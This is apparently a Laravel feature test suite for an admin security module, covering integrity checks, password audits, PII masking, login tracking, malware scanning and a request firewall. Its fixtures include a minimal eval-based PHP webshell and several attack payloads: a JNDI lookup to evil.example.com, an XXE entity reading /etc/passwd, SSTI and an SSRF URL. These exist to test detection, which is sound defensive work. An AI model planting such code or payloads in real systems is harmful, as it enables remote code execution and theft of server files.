<?php

namespace Tests\Feature;

use App\Models\FileIntegrityBaseline;
use App\Models\SecurityLog;
use App\Models\User;
use App\Models\VulnerabilityScan;
use App\Services\SecurityService;
use App\Services\VulnerabilityScanner;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Tests\TestCase;

class SecurityCiaTest extends TestCase
{
    use DatabaseTransactions;

    private function admin(): User
    {
        return User::create([
            'username' => 'admincia',
            'name' => 'Admin CIA',
            'email' => 'admincia@example.com',
            'password' => bcrypt('secret123'),
            'role' => 'admin',
            'status' => 'aktif',
        ]);
    }

    public function test_halaman_security_memuat_data_integrity_health_dan_password_audit(): void
    {
        $this->actingAs($this->admin())
            ->get('/admin/security')
            ->assertOk()
            ->assertInertia(fn ($page) => $page->component('Admin/Security')
                ->has('integrity')
                ->has('health')
                ->has('passwordAudit.total')
                ->has('vulnerabilityScans.cve')
                ->has('vulnerabilityScans.malware'));
    }

    public function test_rebuild_integrity_baseline_membuat_checkpoint(): void
    {
        FileIntegrityBaseline::query()->delete();

        $this->actingAs($this->admin())
            ->post('/admin/security/integrity/rebuild')
            ->assertRedirect();

        $this->assertGreaterThan(0, FileIntegrityBaseline::query()->count());
        $this->assertDatabaseHas('file_integrity_baselines', ['path' => '.env']);
    }

    public function test_integrity_status_menandai_berkas_yang_diubah(): void
    {
        $service = app(SecurityService::class);
        $service->rebuildFileIntegrityBaseline();

        // Simulasikan ubahan: tulis ulang baseline .env dengan checksum berbeda.
        FileIntegrityBaseline::where('path', '.env')->update([
            'checksum' => str_repeat('a', 64),
        ]);

        $status = collect($service->fileIntegrityStatus())
            ->firstWhere('path', '.env');

        $this->assertNotNull($status);
        $this->assertSame('modified', $status['status']);
    }

    public function test_system_health_menilai_database_dan_cache(): void
    {
        $health = app(SecurityService::class)->systemHealth();

        $byKey = collect($health)->keyBy('key');

        $this->assertTrue($byKey['database']['ok']);
        $this->assertTrue($byKey['cache']['ok']);
    }

    public function test_password_audit_mendeteksi_hash_lemah(): void
    {
        // Bypass cast 'hashed' — simulasikan hash md5 lama langsung di database.
        DB::table('users')->insert([
            'username' => 'weakpw',
            'name' => 'Password Lemah',
            'email' => 'weakpw@example.com',
            'password' => md5('secret123'),
            'role' => 'student',
            'status' => 'aktif',
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        $weak = User::where('username', 'weakpw')->firstOrFail();

        $audit = app(SecurityService::class)->passwordHashAudit();

        $this->assertGreaterThanOrEqual(1, $audit['weak']);
        $this->assertContains($weak->id, array_column($audit['weak_users'], 'id'));
    }

    public function test_export_csv_memask_email_pii(): void
    {
        $user = User::create([
            'username' => 'piiuser',
            'name' => 'rahasia@example.com',
            'email' => 'rahasia@example.com',
            'password' => bcrypt('secret123'),
            'role' => 'student',
            'status' => 'aktif',
        ]);

        SecurityLog::create([
            'tipe' => 'login_sukses',
            'user_id' => $user->id,
            'ip_address' => '127.0.0.1',
            'browser' => 'Chrome',
            'sistem_operasi' => 'Windows',
            'keterangan' => 'Login berhasil melalui panel siswa',
        ]);

        $response = $this->actingAs($this->admin());

        $alreadyAuthed = $response->get('/admin/security/export');

        $alreadyAuthed->assertOk();
        $this->assertStringNotContainsString('rahasia@example.com', $alreadyAuthed->streamedContent());
        $this->assertStringContainsString('r***@***.com', $alreadyAuthed->streamedContent());
    }

    public function test_login_dari_ip_baru_ditandai_perangkat_baru(): void
    {
        $this->admin();

        // Login pertama dari IP-A.
        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.5'])
            ->post('/admin/login', ['username' => 'admincia', 'password' => 'secret123'])
            ->assertRedirect();

        // Logout agar bisa login lagi dari IP-B.
        $this->post('/logout')->assertRedirect();

        // Login kedua dari IP-B (perangkat baru).
        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.6'])
            ->post('/admin/login', ['username' => 'admincia', 'password' => 'secret123'])
            ->assertRedirect();

        $history = app(SecurityService::class)->loginHistory();

        $second = $history->first(fn ($log) => $log['ip'] === '198.51.100.6');

        $this->assertNotNull($second);
        $this->assertTrue($second['perangkat_baru']);
    }

    public function test_scan_malware_mendeteksi_webshell_di_berkas_palsu(): void
    {
        $dir = base_path('app/Support/__scan_fixture__');
        File::makeDirectory($dir, 0755, true);

        File::put($dir.'/backdoor.php', "<?php\n\$c = base64_decode(\$_GET['x']);\neval(\$c);\n");

        try {
            $scan = app(VulnerabilityScanner::class)->scanMalware();

            $this->assertSame('issues', $scan->status);
            $this->assertNotNull($scan->findings);

            $hit = collect($scan->findings)
                ->firstWhere('pattern', 'eval');

            $this->assertNotNull($hit);
            $this->assertStringContainsString('__scan_fixture__', $hit['file']);
        } finally {
            File::deleteDirectory($dir);
        }
    }

    public function test_scan_malware_mengabaikan_berkas_allowlist(): void
    {
        $scan = app(VulnerabilityScanner::class)->scanMalware();

        $files = collect($scan->findings ?? [])->pluck('file');

        $this->assertNotContains('app/Services/PythonRunner.php', $files->all());
    }

    public function test_scan_cve_memuat_hasil_terakhir_dan_command_dijadwalkan(): void
    {
        VulnerabilityScan::create([
            'scanner' => 'cve',
            'status' => 'clean',
            'summary' => 'Aman.',
            'findings' => [],
            'scanned_at' => now(),
        ]);

        $scans = app(SecurityService::class)->vulnerabilityScans();

        $this->assertSame('clean', $scans['cve']['status']);
        $this->assertSame('Aman.', $scans['cve']['summary']);

        $this->artisan('list')
            ->expectsOutputToContain('security:cve-scan')
            ->expectsOutputToContain('security:malware-scan');
    }

    public function test_firewall_memblokir_pola_serangan_modern(): void
    {
        $payloads = [
            '{{7*7}}',
            '${jndi:ldap://evil.example.com/a}',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            'http://localhost:80/internal',
            '/upload/shell.php',
        ];

        foreach ($payloads as $payload) {
            $this->assertNotNull(
                \App\Support\SecurityGuard::scanString($payload, false),
                "Payload harus diblokir: {$payload}"
            );
        }
    }
}
